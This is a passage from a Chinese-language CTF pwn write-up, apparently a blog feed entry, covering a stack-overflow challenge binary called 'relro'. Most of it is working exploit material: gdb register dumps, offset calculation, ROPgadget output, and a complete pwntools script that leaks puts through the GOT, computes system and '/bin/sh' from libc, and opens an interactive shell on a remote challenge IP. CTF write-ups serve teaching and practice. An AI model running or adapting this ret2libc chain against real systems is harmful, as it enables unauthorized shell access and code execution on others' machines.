<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>
RAX: 0x603010 --<span class="token operator">></span> 0x0 
RBX: 0x0 
RCX: 0x7fffffffde30 --<span class="token operator">></span> 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
RDX: 0xff 
RSI: 0x7fffffffde30 --<span class="token operator">></span> 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
RDI: 0x603010 --<span class="token operator">></span> 0x0 
RBP: 0x7fffffffde70 --<span class="token operator">></span> 0x7fffffffdea0 --<span class="token operator">></span> 0x400c70 <span class="token punctuation">(</span>push   r15<span class="token punctuation">)</span>
RSP: 0x7fffffffde30 --<span class="token operator">></span> 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
RIP: 0x400b1b <span class="token punctuation">(</span>call   0x400770 <span class="token operator">&lt;</span>strncpy@plt<span class="token operator">></span><span class="token punctuation">)</span>
R8 <span class="token keyword">:</span> 0x7ffff7fda700 <span class="token punctuation">(</span>0x00007ffff7fda700<span class="token punctuation">)</span>
R9 <span class="token keyword">:</span> 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400810 <span class="token punctuation">(</span>xor    ebp,ebp<span class="token punctuation">)</span>
R13: 0x7fffffffdf80 --<span class="token operator">></span> 0x1 
R14: 0x0 
R15: 0x0
</code></pre>
<p>然后计算当前src地址</p>
<p>ida可以看到</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> src<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>
</code></pre>
<p>所以当前rsp就是src地址</p>
<p>那我们计算当前src距rbp的偏移</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">Breakpoint 1, 0x0000000000400b1b <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
gdb-peda$ p/d 0x7fffffffde70-0x7fffffffde30
<span class="token variable">$1</span> <span class="token operator">=</span> 64
</code></pre>
<p>因为rbp距离ret的偏移为0x8</p>
<p>所以我们可以得到偏移为72</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ p/d 0x7fffffffde70-0x7fffffffde30 +0x8
<span class="token variable">$2</span> <span class="token operator">=</span> 72
</code></pre>
<h4 id="leak-memory"><a href="#leak-memory" class="headerlink" title="leak memory"></a>leak memory</h4><p> 关于leak memory 我在博客其他文章都有写到可以去参考</p>
<p>既然可以可以溢出覆盖到ret 那我们基本rop leak即可</p>
<p>同样注意 64位下 参数 从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9。从第7个参数开始，接下来的所有参数都将通过栈传递</p>
<p>利用ROPgadget搜索可用gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ ROPgadget --binary relro --only <span class="token string">"pop|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x0000000000400ccc <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400cce <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400cd0 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400cd2 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400ccb <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400ccf <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004008d9 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400cd3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
0x0000000000400cd1 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400ccd <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400746 <span class="token keyword">:</span> ret
0x000000000040028e <span class="token keyword">:</span> ret 0x8f7b
0x0000000000400c56 <span class="token keyword">:</span> ret 0xb60f

Unique gadgets found: 13
</code></pre>
<p>那我们这里用rdi</p>
<h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'relro'</span><span class="token punctuation">)</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
start_main <span class="token operator">=</span> <span class="token number">0x400810</span>
rdi <span class="token operator">=</span> <span class="token number">0x400cd3</span> <span class="token comment" spellcheck="true">#pop rdi ; ret</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_main<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"save message success.\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span>  p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
</code></pre>
<p>payload = 先覆盖到ret +覆盖ret位pop_rdi_ret（给puts()赋值 ） +准备泄露的puts_addr+puts_plt(调用puts()函数 )+返回程序开头 start_main</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为我们重新返回到程序头所以会重新执行到main  既然我们leak出了puts函数地址所以我们可以根据提供的libc计算system_addr以及/bin/sh_addr 接着再次rop将/bin/sh参数放入rdi寄存器 然后执行system()调用 </p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>binsh
payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
</code></pre>
<h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

<span class="token comment" spellcheck="true">#p = process('./relro')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'118.25.227.117'</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'relro'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choose: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your message:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
start_main <span class="token operator">=</span> <span class="token number">0x400810</span>
fake <span class="token operator">=</span><span class="token number">0x400A2C</span>
rdi <span class="token operator">=</span> <span class="token number">0x400cd3</span> <span class="token comment" spellcheck="true">#pop rdi ; ret</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_main<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"save message success.\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span>  p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choose: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your message:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
binsh <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>binsh
payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/23/西电线下赛PWN-writeup/3.jpg" alt="3"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛结束了…垃圾的我拿了第六 菜归菜 但是也要继续学习orz&lt;/p&gt;
&lt;p&gt;感谢每一位西电的学长&lt;/p&gt;
&lt;h2 id=&quot;PWN1-EZ&quot;&gt;&lt;a href=&quot;#PWN1-EZ&quot; class=&quot;headerlink&quot; title=&quot;PWN1  EZ&quot;&gt;&lt;/a&gt;PWN1  EZ
    
    </summary>
    
    
  </entry>
  
</feed>
